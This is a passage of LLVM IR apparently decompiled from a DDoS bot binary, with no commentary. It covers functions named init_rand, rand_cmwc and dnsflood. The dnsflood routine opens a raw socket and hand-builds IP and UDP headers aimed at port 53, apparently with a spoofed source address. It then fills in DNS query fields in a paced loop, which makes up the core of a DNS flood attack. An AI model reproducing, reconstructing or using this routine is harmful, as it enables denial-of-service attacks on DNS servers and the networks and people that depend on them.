  %v1_80494d9 = trunc i32 %v4_8049506 to i8
  %v4_80494d9 = sub i8 %v1_80494d9, %stack_var_-16.2
  %v20_80494d9 = zext i8 %v4_80494d9 to i32
  %v23_80494d9 = or i32 %v3_80494d4, %v20_80494d9
  store i32 %v23_80494d9, i32* %edx.global-to-local, align 4
  %v4_80494db = ptrtoint i8* %stack_var_4.2 to i32
  store i8 %v4_80494d9, i8* %stack_var_4.2, align 1
  %v5_80494e0 = add i32 %v4_80494db, 1
  %stack_var_4.015 = inttoptr i32 %v5_80494e0 to i8*
  %v4_80494f816 = sext i8 %stack_var_-16.2 to i32
  %v5_80494fe24 = icmp slt i32 %v4_80494f816, %v4_8049506
  br i1 %v5_80494fe24, label %dec_label_pc_80494e5, label %dec_label_pc_8049500

dec_label_pc_80494e5:                             ; preds = %dec_label_pc_80494d1, %dec_label_pc_80494e5
  %v4_80494f827 = phi i32 [ %v4_80494f8, %dec_label_pc_80494e5 ], [ %v4_80494f816, %dec_label_pc_80494d1 ]
  %stack_var_4.026 = phi i8* [ %stack_var_4.0, %dec_label_pc_80494e5 ], [ %stack_var_4.015, %dec_label_pc_80494d1 ]
  %stack_var_4.0.in25 = phi i32 [ %v5_80494f2, %dec_label_pc_80494e5 ], [ %v5_80494e0, %dec_label_pc_80494d1 ]
  %v6_80494e8 = add i32 %v4_80494f827, %v4_804949b
  %v1_80494eb = inttoptr i32 %v6_80494e8 to i8*
  %v2_80494eb = load i8, i8* %v1_80494eb, align 1
  %v3_80494eb = zext i8 %v2_80494eb to i32
  %v4_80494eb = load i32, i32* %edx.global-to-local, align 4
  %v5_80494eb = and i32 %v4_80494eb, -256
  %v6_80494eb = or i32 %v5_80494eb, %v3_80494eb
  store i32 %v6_80494eb, i32* %edx.global-to-local, align 4
  store i8 %v2_80494eb, i8* %stack_var_4.026, align 1
  %v5_80494f2 = add i32 %stack_var_4.0.in25, 1
  %stack_var_4.0 = inttoptr i32 %v5_80494f2 to i8*
  %v5_80494f5 = mul i32 %v4_80494f827, 16777216
  %sext = add i32 %v5_80494f5, 16777216
  %v4_80494f8 = sdiv i32 %sext, 16777216
  %v5_80494fe = icmp slt i32 %v4_80494f8, %v4_8049506
  br i1 %v5_80494fe, label %dec_label_pc_80494e5, label %dec_label_pc_8049500

dec_label_pc_8049500:                             ; preds = %dec_label_pc_80494e5, %dec_label_pc_80494d1
  %stack_var_4.0.lcssa = phi i8* [ %stack_var_4.015, %dec_label_pc_80494d1 ], [ %stack_var_4.0, %dec_label_pc_80494e5 ]
  %v4_80494f8.lcssa = phi i32 [ %v4_80494f816, %dec_label_pc_80494d1 ], [ %v4_80494f8, %dec_label_pc_80494e5 ]
  %v5_8049500 = add nsw i32 %v4_80494f8.lcssa, 1
  %v14_8049500 = trunc i32 %v5_8049500 to i8
  br label %dec_label_pc_8049503

dec_label_pc_8049503:                             ; preds = %dec_label_pc_80494c5, %dec_label_pc_8049500
  %stack_var_4.1 = phi i8* [ %stack_var_4.2, %dec_label_pc_80494c5 ], [ %stack_var_4.0.lcssa, %dec_label_pc_8049500 ]
  %stack_var_-16.1 = phi i8 [ %stack_var_-16.2, %dec_label_pc_80494c5 ], [ %v14_8049500, %dec_label_pc_8049500 ]
  %v5_8049503 = add i32 %v4_8049506, 1
  %v22_8049503 = inttoptr i32 %v5_8049503 to i8*
  br label %dec_label_pc_8049506

dec_label_pc_8049506:                             ; preds = %entry, %dec_label_pc_8049503
  %stack_var_4.2 = phi i8* [ %tmp, %entry ], [ %stack_var_4.1, %dec_label_pc_8049503 ]
  %stack_var_-16.2 = phi i8 [ 0, %entry ], [ %stack_var_-16.1, %dec_label_pc_8049503 ]
  %storemerge = phi i8* [ null, %entry ], [ %v22_8049503, %dec_label_pc_8049503 ]
  %v4_8049506 = ptrtoint i8* %storemerge to i32
  store i32 %v4_8049506, i32* %edx.global-to-local, align 4
  %v3_804951a = call i32 @_strlen(i8* %v4_80494ab)
  %v7_8049521 = icmp ult i32 %v4_8049506, %v3_804951a
  br i1 %v7_8049521, label %dec_label_pc_80494c5, label %dec_label_pc_8049525

dec_label_pc_8049525:                             ; preds = %dec_label_pc_8049506
  %v4_8049525 = ptrtoint i8* %stack_var_4.2 to i32
  store i8 0, i8* %stack_var_4.2, align 1
  ret i32 %v4_8049525

; uselistorder directives
  uselistorder i32 %v4_8049506, { 0, 7, 3, 1, 5, 2, 4, 6 }
  uselistorder i8 %stack_var_-16.2, { 1, 0, 2 }
  uselistorder i8* %stack_var_4.2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v4_80494f8, { 2, 0, 1 }
  uselistorder i32 %v5_80494f2, { 1, 0 }
  uselistorder i32 %v4_804949b, { 1, 2, 0, 3 }
  uselistorder i16* %tmp9, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_8049506, { 1, 0 }
  uselistorder label %dec_label_pc_8049503, { 1, 0 }
  uselistorder label %dec_label_pc_80494e5, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @global_var_80744a0.73, align 32
  %v1_8049545 = add i32 %arg1, -1640531527
  store i32 %v1_8049545, i32* @global_var_80744a4.74, align 4
  %v1_8049552 = add i32 %arg1, 1013904242
  store i32 %v1_8049552, i32* %eax.global-to-local, align 4
  store i32 %v1_8049552, i32* @global_var_80744a8.75, align 8
  br label %dec_label_pc_8049565

dec_label_pc_8049565:                             ; preds = %entry, %dec_label_pc_8049565
  %storemerge5 = phi i32 [ 3, %entry ], [ %v4_8049595, %dec_label_pc_8049565 ]
  store i32 %storemerge5, i32* @ecx, align 4
  %v1_804956b = add nsw i32 %storemerge5, -3
  store i32 %v1_804956b, i32* %eax.global-to-local, align 4
  %v1_804956e = mul nuw nsw i32 %v1_804956b, 4
  %v2_804956e = add i32 %v1_804956e, ptrtoint (i32* @global_var_80744a0.73 to i32)
  %v3_804956e = inttoptr i32 %v2_804956e to i32*
  %v4_804956e = load i32, i32* %v3_804956e, align 4
  %v1_8049578 = add nsw i32 %storemerge5, -2
  store i32 %v1_8049578, i32* %eax.global-to-local, align 4
  %v1_804957b = mul nuw nsw i32 %v1_8049578, 4
  %v2_804957b = add i32 %v1_804957b, ptrtoint (i32* @global_var_80744a0.73 to i32)
  %v3_804957b = inttoptr i32 %v2_804957b to i32*
  %v4_804957b = load i32, i32* %v3_804957b, align 4
  %v2_8049582 = xor i32 %v4_804957b, %v4_804956e
  %v2_8049587 = xor i32 %storemerge5, -1640531527
  %v1_8049589 = xor i32 %v2_8049587, %v2_8049582
  store i32 %v1_8049589, i32* %eax.global-to-local, align 4
  %v2_804958e = mul nuw nsw i32 %storemerge5, 4
  %v3_804958e = add i32 %v2_804958e, ptrtoint (i32* @global_var_80744a0.73 to i32)
  %v4_804958e = inttoptr i32 %v3_804958e to i32*
  store i32 %v1_8049589, i32* %v4_804958e, align 4
  %v4_8049595 = add nuw nsw i32 %storemerge5, 1
  %exitcond = icmp eq i32 %v4_8049595, 4096
  br i1 %exitcond, label %dec_label_pc_80495a1, label %dec_label_pc_8049565

dec_label_pc_80495a1:                             ; preds = %dec_label_pc_8049565
  %v0_80495a2 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80495a2

; uselistorder directives
  uselistorder i32 %storemerge5, { 3, 4, 5, 2, 0, 1 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049565, { 1, 0 }
}

define i32 @rand_cmwc(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80495bf = load i32, i32* @global_var_806f714.76, align 4
  %v1_80495c4 = add i32 %v0_80495bf, 1
  %v1_80495c5 = urem i32 %v1_80495c4, 4096
  store i32 %v1_80495c5, i32* @global_var_806f714.76, align 4
  %v1_80495d4 = mul nuw nsw i32 %v1_80495c5, 4
  %v2_80495d4 = add i32 %v1_80495d4, ptrtoint (i32* @global_var_80744a0.73 to i32)
  %v3_80495d4 = inttoptr i32 %v2_80495d4 to i32*
  %v4_80495d4 = load i32, i32* %v3_80495d4, align 4
  %v7_80495f1 = udiv i32 %v4_80495d4, 228675
  store i32 %v7_80495f1, i32* @global_var_806f710.77, align 16
  br i1 true, label %dec_label_pc_8049641, label %dec_label_pc_8049633

dec_label_pc_8049633:                             ; preds = %entry
  br label %dec_label_pc_8049641

dec_label_pc_8049641:                             ; preds = %entry, %dec_label_pc_8049633
  store i32 %v1_80495c5, i32* @ecx, align 4
  %v1_8049656 = mul nuw nsw i32 %v1_80495c5, 4
  %v2_8049656 = add i32 %v1_8049656, ptrtoint (i32* @global_var_80744a0.73 to i32)
  %v3_8049656 = inttoptr i32 %v2_8049656 to i32*
  %v4_8049656 = load i32, i32* %v3_8049656, align 4
  ret i32 %v4_8049656

; uselistorder directives
  uselistorder i32 %v1_80495c5, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8049641, { 1, 0 }
}

define i32 @setup_udp_header(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8049667 = load i32, i32* @eax, align 4
  ret i32 %v0_8049667
}

define i32 @dnsflood(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp59 = ptrtoint i32* %arg1 to i32
  %stack_var_-8780 = alloca i32, align 4
  %stack_var_-8252 = alloca i32, align 4
  %v0_804966b = load i32, i32* @edi, align 4
  store i32 %tmp59, i32* %eax.global-to-local, align 4
  %v2_804967b = load i32, i32* %arg1, align 4
  store i32 %v2_804967b, i32* %eax.global-to-local, align 4
  %v0_804967d = load i32, i32* inttoptr (i32 134692204 to i32*), align 4
  store i32 %v0_804967d, i32* @edx, align 4
  %v5_804968d = call i32 @fprintf(i32 %v0_804967d, i32 ptrtoint ([19 x i8]* @global_var_8069021.81 to i32), i32 %v2_804967b)
  store i32 %v5_804968d, i32* %eax.global-to-local, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v1_804969f = add i32 %tmp59, 8
  %v2_804969f = inttoptr i32 %v1_804969f to i32*
  %v3_804969f = load i32, i32* %v2_804969f, align 4
  store i32 %v3_804969f, i32* %eax.global-to-local, align 4
  %v1_80496a8 = add i32 %tmp59, 12
  %v2_80496a8 = inttoptr i32 %v1_80496a8 to i32*
  %v3_80496a8 = load i32, i32* %v2_80496a8, align 4
  store i32 %tmp59, i32* %eax.global-to-local, align 4
  %v1_80496c6 = add i32 %tmp59, 4
  %v2_80496c6 = inttoptr i32 %v1_80496c6 to i32*
  %v3_80496c6 = load i32, i32* %v2_80496c6, align 4
  store i32 %tmp59, i32* %eax.global-to-local, align 4
  %v1_80496cf = add i32 %tmp59, 24
  %v2_80496cf = inttoptr i32 %v1_80496cf to i32*
  %v3_80496cf = load i32, i32* %v2_80496cf, align 4
  store i32 %v3_80496cf, i32* %eax.global-to-local, align 4
  %v5_80496e1 = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v5_80496e1, i32* %eax.global-to-local, align 4
  %v5_80496ec = icmp slt i32 %v5_80496e1, 0
  %v1_80496f0 = icmp eq i1 %v5_80496ec, false
  br i1 %v1_80496f0, label %dec_label_pc_8049713, label %dec_label_pc_80496f2

dec_label_pc_80496f2:                             ; preds = %entry
  %v0_80496f2 = load i32, i32* inttoptr (i32 134692208 to i32*), align 16
  store i32 %v0_80496f2, i32* %eax.global-to-local, align 4
  %v6_8049701 = call i32 @fwrite(i32 ptrtoint ([49 x i8]* @global_var_8069034.82 to i32), i32 1, i32 48, i32 %v0_80496f2)
  store i32 %v6_8049701, i32* %eax.global-to-local, align 4
  %v2_804970e = call i32 @__GI_exit(i32 -1)
  store i32 %v2_804970e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049713

dec_label_pc_8049713:                             ; preds = %entry, %dec_label_pc_80496f2
  %v3_8049718 = call i32 @__GI_time(i32* null)
  store i32 %v3_8049718, i32* %eax.global-to-local, align 4
  %v1_8049721 = call i32 @init_rand(i32 %v3_8049718)
  %v2_8049729 = ptrtoint i32* %stack_var_-8252 to i32
  store i32 %v2_8049729, i32* %edx.global-to-local, align 4
  store i32 8192, i32* %eax.global-to-local, align 4
  %tmp69 = bitcast i32* %stack_var_-8252 to i8*
  %v6_804973d = call i32 @__GI_memset(i8* %tmp69, i32 0, i32 8192)
  store i32 %v2_8049729, i32* %edx.global-to-local, align 4
  store i8 69, i8* %tmp69, align 4
  %v1_804976b = or i32 %v2_8049729, 1
  %v2_804976b = inttoptr i32 %v1_804976b to i8*
  store i8 0, i8* %v2_804976b, align 1
  store i32 %v2_8049729, i32* %eax.global-to-local, align 4
  %v1_8049772 = or i32 %v2_8049729, 2
  %v2_8049772 = inttoptr i32 %v1_8049772 to i16*
  store i16 58, i16* %v2_8049772, align 2
  %v2_8049780 = call i32 @htonl(i32 54321)
  %v3_8049780 = trunc i32 %v2_8049780 to i16
  %sext7 = mul i32 %v2_8049780, 65536
  %v1_8049788 = sdiv i32 %sext7, 65536
  store i32 %v1_8049788, i32* @edx, align 4
  %v3_804978d = add i32 %v2_8049729, 4
  %v4_804978d = inttoptr i32 %v3_804978d to i16*
  store i16 %v3_8049780, i16* %v4_804978d, align 4
  %v1_8049794 = add i32 %v2_8049729, 6
  %v2_8049794 = inttoptr i32 %v1_8049794 to i16*
  store i16 0, i16* %v2_8049794, align 2
  %v1_804979d = add i32 %v2_8049729, 8
  %v2_804979d = inttoptr i32 %v1_804979d to i8*
  store i8 -1, i8* %v2_804979d, align 4
  %v1_80497a4 = add i32 %v2_8049729, 9
  %v2_80497a4 = inttoptr i32 %v1_80497a4 to i8*
  store i8 17, i8* %v2_80497a4, align 1
  store i32 %v2_8049729, i32* %eax.global-to-local, align 4
  %v1_80497ab = add i32 %v2_8049729, 10
  %v2_80497ab = inttoptr i32 %v1_80497ab to i16*
  store i16 0, i16* %v2_80497ab, align 2
  %v2_80497b9 = call i32 @inet_addr(i32 ptrtoint ([14 x i8]* @global_var_8069065.83 to i32))
  %v2_80497c6 = add i32 %v2_8049729, 12
  %v3_80497c6 = inttoptr i32 %v2_80497c6 to i32*
  store i32 %v2_80497b9, i32* %v3_80497c6, align 4
  store i32 20, i32* %edx.global-to-local, align 4
  %v2_80497dd = add i32 %v2_8049729, 20
  %v5_80497df = inttoptr i32 %v2_80497dd to i16*
  %v1_80497e5 = urem i32 %v3_80496cf, 65536
  store i32 %v1_80497e5, i32* %eax.global-to-local, align 4
  %v2_80497ee = call i32 @htons(i32 %v1_80497e5)
  %v3_80497ee = trunc i32 %v2_80497ee to i16
  %sext8 = mul i32 %v2_80497ee, 65536
  %v1_80497f6 = sdiv i32 %sext8, 65536
  store i32 %v1_80497f6, i32* %edx.global-to-local, align 4
  store i32 %v2_80497dd, i32* %eax.global-to-local, align 4
  store i16 %v3_80497ee, i16* %v5_80497df, align 4
  %v2_8049803 = call i32 @htons(i32 53)
  %v3_8049803 = trunc i32 %v2_8049803 to i16
  %v3_8049810 = add i32 %v2_8049729, 22
  %v4_8049810 = inttoptr i32 %v3_8049810 to i16*
  store i16 %v3_8049803, i16* %v4_8049810, align 2
  %v1_8049817 = add i32 %v2_8049729, 26
  %v2_8049817 = inttoptr i32 %v1_8049817 to i16*
  store i16 0, i16* %v2_8049817, align 2
  store i32 28, i32* %edx.global-to-local, align 4
  %v2_8049831 = add i32 %v2_8049729, 28
  store i32 %v2_8049831, i32* %eax.global-to-local, align 4
  %v5_8049833 = inttoptr i32 %v2_8049831 to i16*
  %v1_8049836 = call i32 @rand_cmwc(i32 28)
  %v1_804983b = urem i32 %v1_8049836, 65536
  store i32 %v1_804983b, i32* %eax.global-to-local, align 4
  %v2_8049844 = call i32 @htons(i32 %v1_804983b)
  %v3_8049844 = trunc i32 %v2_8049844 to i16
  store i32 %v2_8049831, i32* %eax.global-to-local, align 4
  store i16 %v3_8049844, i16* %v5_8049833, align 4
  store i32 %v2_8049831, i32* %edx.global-to-local, align 4
  %v1_8049857 = add i32 %v2_8049729, 30
  %v2_8049857 = inttoptr i32 %v1_8049857 to i8*
  %v3_8049857 = load i8, i8* %v2_8049857, align 2
  %tmp = urem i8 %v3_8049857, -128
  %v1_804985a = zext i8 %tmp to i32
  store i32 %v1_804985a, i32* %eax.global-to-local, align 4
  store i8 %tmp, i8* %v2_8049857, align 2
  store i32 %v2_8049831, i32* %edx.global-to-local, align 4
  %v3_8049863 = load i8, i8* %v2_8049857, align 2
  %v4_8049863 = zext i8 %v3_8049863 to i32
  %v5_8049863 = load i32, i32* %eax.global-to-local, align 4
  %v6_8049863 = and i32 %v5_8049863, -256
  %v4_8049863.masked = and i32 %v4_8049863, 135
  %v1_8049866 = or i32 %v6_8049863, %v4_8049863.masked
  %v4_8049866 = trunc i32 %v4_8049863.masked to i8
  store i32 %v1_8049866, i32* %eax.global-to-local, align 4
  store i8 %v4_8049866, i8* %v2_8049857, align 2
  store i32 %v2_8049831, i32* %edx.global-to-local, align 4
  %v3_804986f = load i8, i8* %v2_8049857, align 2
  %v4_804986f = zext i8 %v3_804986f to i32
  %v5_804986f = load i32, i32* %eax.global-to-local, align 4
  %v6_804986f = and i32 %v5_804986f, -256
  %v4_804986f.masked = and i32 %v4_804986f, 251
  %v1_8049872 = or i32 %v6_804986f, %v4_804986f.masked
  %v4_8049872 = trunc i32 %v4_804986f.masked to i8
  store i32 %v1_8049872, i32* %eax.global-to-local, align 4
  store i8 %v4_8049872, i8* %v2_8049857, align 2
  store i32 %v2_8049831, i32* %edx.global-to-local, align 4
  %v3_804987b = load i8, i8* %v2_8049857, align 2
  %v4_804987b = zext i8 %v3_804987b to i32
  %v5_804987b = load i32, i32* %eax.global-to-local, align 4
  %v6_804987b = and i32 %v5_804987b, -256
  %v4_804987b.masked = and i32 %v4_804987b, 253
  %v1_804987e = or i32 %v6_804987b, %v4_804987b.masked
  %v4_804987e = trunc i32 %v4_804987b.masked to i8
  store i32 %v1_804987e, i32* %eax.global-to-local, align 4
  store i8 %v4_804987e, i8* %v2_8049857, align 2
  store i32 %v2_8049831, i32* %edx.global-to-local, align 4
  %v3_8049887 = load i8, i8* %v2_8049857, align 2
  %v4_8049887 = zext i8 %v3_8049887 to i32
  %v5_8049887 = load i32, i32* %eax.global-to-local, align 4
  %v6_8049887 = and i32 %v5_8049887, -256
  %v7_8049887 = or i32 %v4_8049887, %v6_8049887
  %v1_804988a = or i32 %v7_8049887, 1
  %v3_804988a = trunc i32 %v1_804988a to i8
  store i32 %v1_804988a, i32* %eax.global-to-local, align 4
  store i8 %v3_804988a, i8* %v2_8049857, align 2
  store i32 %v2_8049831, i32* %edx.global-to-local, align 4
  %v1_8049893 = add i32 %v2_8049729, 31
  %v2_8049893 = inttoptr i32 %v1_8049893 to i8*
  %v3_8049893 = load i8, i8* %v2_8049893, align 1
  %tmp74 = urem i8 %v3_8049893, -128
  %v1_8049896 = zext i8 %tmp74 to i32
  store i32 %v1_8049896, i32* %eax.global-to-local, align 4
  store i8 %tmp74, i8* %v2_8049893, align 1
  store i32 %v2_8049831, i32* %edx.global-to-local, align 4
  %v3_804989f = load i8, i8* %v2_8049893, align 1
  %v4_804989f = zext i8 %v3_804989f to i32
  %v5_804989f = load i32, i32* %eax.global-to-local, align 4
  %v6_804989f = and i32 %v5_804989f, -256
  %v4_804989f.masked = and i32 %v4_804989f, 191
  %v1_80498a2 = or i32 %v6_804989f, %v4_804989f.masked
  %v4_80498a2 = trunc i32 %v4_804989f.masked to i8
  store i32 %v1_80498a2, i32* %eax.global-to-local, align 4
  store i8 %v4_80498a2, i8* %v2_8049893, align 1
  store i32 %v2_8049831, i32* %edx.global-to-local, align 4
  %v3_80498ab = load i8, i8* %v2_8049893, align 1
  %v4_80498ab = zext i8 %v3_80498ab to i32
  %v5_80498ab = load i32, i32* %eax.global-to-local, align 4
  %v6_80498ab = and i32 %v5_80498ab, -256
  %v4_80498ab.masked = and i32 %v4_80498ab, 223
  %v1_80498ae = or i32 %v6_80498ab, %v4_80498ab.masked
  %v4_80498ae = trunc i32 %v4_80498ab.masked to i8
  store i32 %v1_80498ae, i32* %eax.global-to-local, align 4
  store i8 %v4_80498ae, i8* %v2_8049893, align 1
  store i32 %v2_8049831, i32* %edx.global-to-local, align 4
  %v3_80498b7 = load i8, i8* %v2_8049893, align 1
  %v4_80498b7 = zext i8 %v3_80498b7 to i32
  %v5_80498b7 = load i32, i32* %eax.global-to-local, align 4
  %v6_80498b7 = and i32 %v5_80498b7, -256
  %v4_80498b7.masked = and i32 %v4_80498b7, 239
  %v1_80498ba = or i32 %v6_80498b7, %v4_80498b7.masked
  %v4_80498ba = trunc i32 %v4_80498b7.masked to i8
  store i32 %v1_80498ba, i32* %eax.global-to-local, align 4
  store i8 %v4_80498ba, i8* %v2_8049893, align 1
  store i32 %v2_8049831, i32* %edx.global-to-local, align 4
  %v3_80498c3 = load i8, i8* %v2_8049893, align 1
  %v4_80498c3 = zext i8 %v3_80498c3 to i32
  %v5_80498c3 = load i32, i32* %eax.global-to-local, align 4
  %v6_80498c3 = and i32 %v5_80498c3, -256
  %v4_80498c3.masked = and i32 %v4_80498c3, 240
  %v1_80498c6 = or i32 %v6_80498c3, %v4_80498c3.masked
  %v4_80498c6 = trunc i32 %v4_80498c3.masked to i8
  store i32 %v1_80498c6, i32* %eax.global-to-local, align 4
  store i8 %v4_80498c6, i8* %v2_8049893, align 1
  %v2_80498d1 = call i32 @htons(i32 1)
  %v3_80498d1 = trunc i32 %v2_80498d1 to i16
  %sext11 = mul i32 %v2_80498d1, 65536
  %v1_80498d9 = sdiv i32 %sext11, 65536
  store i32 %v1_80498d9, i32* %edx.global-to-local, align 4
  %v3_80498de = add i32 %v2_8049729, 32
  %v4_80498de = inttoptr i32 %v3_80498de to i16*
  store i16 %v3_80498d1, i16* %v4_80498de, align 4
  %v1_80498e5 = add i32 %v2_8049729, 34
  %v2_80498e5 = inttoptr i32 %v1_80498e5 to i16*
  store i16 0, i16* %v2_80498e5, align 2
  store i32 %v2_8049831, i32* %eax.global-to-local, align 4
  %v1_80498ee = add i32 %v2_8049729, 36
  %v2_80498ee = inttoptr i32 %v1_80498ee to i16*
  store i16 0, i16* %v2_80498ee, align 4
  %v2_80498f9 = call i32 @htons(i32 1)
  %v3_80498f9 = trunc i32 %v2_80498f9 to i16
  %v3_8049906 = add i32 %v2_8049729, 38
  %v4_8049906 = inttoptr i32 %v3_8049906 to i16*
  store i16 %v3_80498f9, i16* %v4_8049906, align 2
  store i32 %v3_80496a8, i32* %edx.global-to-local, align 4
  store i32 %v3_80496a8, i32* %v3_80497c6, align 4
  store i32 %v3_80496c6, i32* %eax.global-to-local, align 4
  %v1_804992f = add i32 %v3_80496c6, 4
  %v2_804992f = inttoptr i32 %v1_804992f to i32*
  %v3_804992f = load i32, i32* %v2_804992f, align 4
  store i32 %v3_804992f, i32* %edx.global-to-local, align 4
  %v2_8049935 = add i32 %v2_8049729, 16
  %v3_8049935 = inttoptr i32 %v2_8049935 to i32*
  store i32 %v3_804992f, i32* %v3_8049935, align 4
  store i32 %v2_8049729, i32* %eax.global-to-local, align 4
  %v3_804993b = load i16, i16* %v2_8049772, align 2
  %v3_804993f = udiv i16 %v3_804993b, 2
  %v9_804993f = zext i16 %v3_804993f to i32
  store i32 %v9_804993f, i32* %eax.global-to-local, align 4
  store i32 %v2_8049729, i32* %edx.global-to-local, align 4
  %v2_804994f = bitcast i32* %stack_var_-8252 to i16*
  %v3_804994f = call i32 @csum(i16* %v2_804994f, i32 %v9_804993f)
  %v4_804994f = trunc i32 %v3_804994f to i16
  %sext13 = mul i32 %v3_804994f, 65536
  %v1_8049957 = sdiv i32 %sext13, 65536
  store i32 %v1_8049957, i32* %edx.global-to-local, align 4
  store i32 %v2_8049729, i32* %eax.global-to-local, align 4
  store i16 %v4_804994f, i16* %v2_80497ab, align 2
  %v2_80499ca = add i32 %v2_8049729, 40
  %v2_80499d9 = ptrtoint i32* %stack_var_-8780 to i32
  %v1_8049a08 = and i32 %v2_80499ca, -256
  %v4_8049a0b = inttoptr i32 %v2_80499ca to i8*
  %v3_8049b69 = add i32 %v2_8049729, 24
  %v4_8049b69 = inttoptr i32 %v3_8049b69 to i16*
  br label %dec_label_pc_804996e

dec_label_pc_804996e:                             ; preds = %dec_label_pc_8049c02, %dec_label_pc_8049713
  %stack_var_-20.0 = phi i16 [ 0, %dec_label_pc_8049713 ], [ %v23_8049b35, %dec_label_pc_8049c02 ]
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_8049713 ], [ %v4_8049c02, %dec_label_pc_8049c02 ]
  %stack_var_-52.0 = phi i32 [ %v3_80496c6, %dec_label_pc_8049713 ], [ %v3_804998b, %dec_label_pc_8049c02 ]
  %v12_804996e = icmp eq i32 %stack_var_-24.0, 2
  %v1_8049972 = icmp eq i1 %v12_804996e, false
  br i1 %v1_8049972, label %dec_label_pc_8049988, label %dec_label_pc_8049974

dec_label_pc_8049974:                             ; preds = %dec_label_pc_804996e
  %v0_8049974 = load i32, i32* @esp, align 4
  %v1_8049977 = add i32 %v0_8049974, -16
  %v2_8049977 = inttoptr i32 %v1_8049977 to i32*
  store i32 100, i32* %v2_8049977, align 4
  %v2_8049979 = sext i16 %stack_var_-20.0 to i64
  %v3_8049979 = call i32 @usleep(i64 %v2_8049979)
  store i32 %v3_8049979, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049988

dec_label_pc_8049988:                             ; preds = %dec_label_pc_804996e, %dec_label_pc_8049974
  %stack_var_-24.1 = phi i32 [ %stack_var_-24.0, %dec_label_pc_804996e ], [ 0, %dec_label_pc_8049974 ]
  store i32 %stack_var_-52.0, i32* %eax.global-to-local, align 4
  %v1_804998b = add i32 %stack_var_-52.0, 532
  %v2_804998b = inttoptr i32 %v1_804998b to i32*
  %v3_804998b = load i32, i32* %v2_804998b, align 4
  %v4_8049994 = sext i16 %stack_var_-20.0 to i32
  %v1_8049997 = add nsw i32 %v4_8049994, 256
  %v5_80499a1 = add nsw i32 %v4_8049994, 40
  store i32 %v5_80499a1, i32* %edx.global-to-local, align 4
  %v2_80499ac = add i32 %v5_80499a1, %v2_8049729
  %v1_80499ae = inttoptr i32 %v2_80499ac to i8*
  store i32 %v2_80499ac, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_80499b1 = and i32 %v2_80499ac, -256
  store i32 %v1_80499b1, i32* %eax.global-to-local, align 4
  %v5_80499b3 = call i8* @_memset(i8* %v1_80499ae, i32 %v1_80499b1, i32 %v1_8049997)
  store i32 40, i32* %edx.global-to-local, align 4
  %v1_80499d2 = add i32 %v3_804998b, 16
  %v0_80499d5 = load i32, i32* @esp, align 4
  %v2_80499d8 = add i32 %v0_80499d5, -12
  %v3_80499d8 = inttoptr i32 %v2_80499d8 to i32*
  store i32 %v1_80499d2, i32* %v3_80499d8, align 4
  store i32 %v2_80499d9, i32* @eax, align 4
  %v2_80499df = add i32 %v0_80499d5, -16
  %v3_80499df = inttoptr i32 %v2_80499df to i32*
  store i32 %v2_80499d9, i32* %v3_80499df, align 4
  %v4_80499e0 = call i32 @strcpy(i8* null, i32 %v2_80499ca)
  %v0_80499e5 = load i32, i32* @esp, align 4
  store i32 %v2_80499d9, i32* %eax.global-to-local, align 4
  %v2_80499ee = add i32 %v0_80499e5, 12
  %v3_80499ee = inttoptr i32 %v2_80499ee to i32*
  store i32 %v2_80499d9, i32* %v3_80499ee, align 4
  %v5_80499ef = add i32 %v0_80499e5, 8
  %v6_80499ef = inttoptr i32 %v5_80499ef to i32*
  store i32 %v2_80499ca, i32* %v6_80499ef, align 4
  %v0_80499f2 = call i32 @ChangetoDnsNameFormat()
  store i32 %v1_8049a08, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v2_80499ca, i32* @edi, align 4
  %v3_8049a11 = call i32 @_strlen(i8* %v4_8049a0b)
  %tmp75 = mul i32 %v3_8049a11, 65536
  %sext = add i32 %tmp75, 65536
  %v4_8049a24 = sdiv i32 %sext, 65536
  %v5_8049a27 = add nsw i32 %v4_8049a24, 40
  store i32 %v5_8049a27, i32* %edx.global-to-local, align 4
  %v2_8049a32 = add i32 %v5_8049a27, %v2_8049729
  store i32 %v2_8049a32, i32* %eax.global-to-local, align 4
  %v5_8049a34 = inttoptr i32 %v2_8049a32 to i16*
  %v0_8049a37 = load i32, i32* @esp, align 4
  %v1_8049a3a = add i32 %v0_8049a37, -16
  %v2_8049a3a = inttoptr i32 %v1_8049a3a to i32*
  store i32 255, i32* %v2_8049a3a, align 4
  %v2_8049a3f = call i32 @htons(i32 %v4_8049a24)
  %v3_8049a3f = trunc i32 %v2_8049a3f to i16
  %sext15 = mul i32 %v2_8049a3f, 65536
  %v1_8049a47 = sdiv i32 %sext15, 65536
  store i32 %v1_8049a47, i32* %edx.global-to-local, align 4
  store i32 %v2_8049a32, i32* %eax.global-to-local, align 4
  store i16 %v3_8049a3f, i16* %v5_8049a34, align 2
  %v0_8049a4f = load i32, i32* @esp, align 4
  %v1_8049a52 = add i32 %v0_8049a4f, -16
  %v2_8049a52 = inttoptr i32 %v1_8049a52 to i32*
  store i32 1, i32* %v2_8049a52, align 4
  %v2_8049a54 = call i32 @htons(i32 %v2_8049a32)
  %v3_8049a54 = trunc i32 %v2_8049a54 to i16
  %sext16 = mul i32 %v2_8049a54, 65536
  %v1_8049a5c = sdiv i32 %sext16, 65536
  store i32 %v1_8049a5c, i32* %edx.global-to-local, align 4
  %v3_8049a61 = add i32 %v2_8049a32, 2
  %v4_8049a61 = inttoptr i32 %v3_8049a61 to i16*
  store i16 %v3_8049a54, i16* %v4_8049a61, align 2
  %sext6 = add i32 %tmp75, 327680
